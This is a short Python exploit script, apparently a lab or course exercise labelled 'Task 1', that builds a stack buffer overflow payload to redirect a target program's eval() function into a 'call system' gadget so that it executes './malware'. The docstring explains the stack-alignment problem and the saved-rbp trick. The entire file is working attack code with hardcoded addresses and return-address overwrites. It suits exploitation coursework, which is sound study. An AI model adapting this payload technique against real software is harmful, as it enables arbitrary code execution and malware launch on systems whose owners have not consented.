#!/usr/bin/env python3
"""Task 1: run ./malware via the overflow.

We cannot build a pop rdi / &cmd / system chain here: the fixed stack has
only 0x...ff0 and 0x...ff8 above the return address, and entering system
with rsp == 0x721000801000 breaks its 16-byte stack alignment (movaps in
do_system -> SIGSEGV).

So we jump into eval() right at `mov edi,0x6030d0 ; call system`, which
sets rdi for us and enters system through a real `call` (aligned).
eval()'s epilogue then does leave/ret back to the same place, so the
second iteration runs system() once more; we point saved rbp at the
buffer so that the following leave/ret walks into garbage and dies.
"""
import sys
from struct import pack

CMD         = b"./malware\x00"
EXPR        = 0x721000800fd0
SYSTEM_CALL = 0x401a6b          # mov edi, 0x6030d0 ; call system@plt

payload  = CMD + b"A" * (0x10 - len(CMD))        # expression[16]
payload += pack("<Q", EXPR)                      # saved rbp -> 2nd leave lands here
payload += pack("<Q", SYSTEM_CALL)

sys.stdout.buffer.write(payload + b"\n")
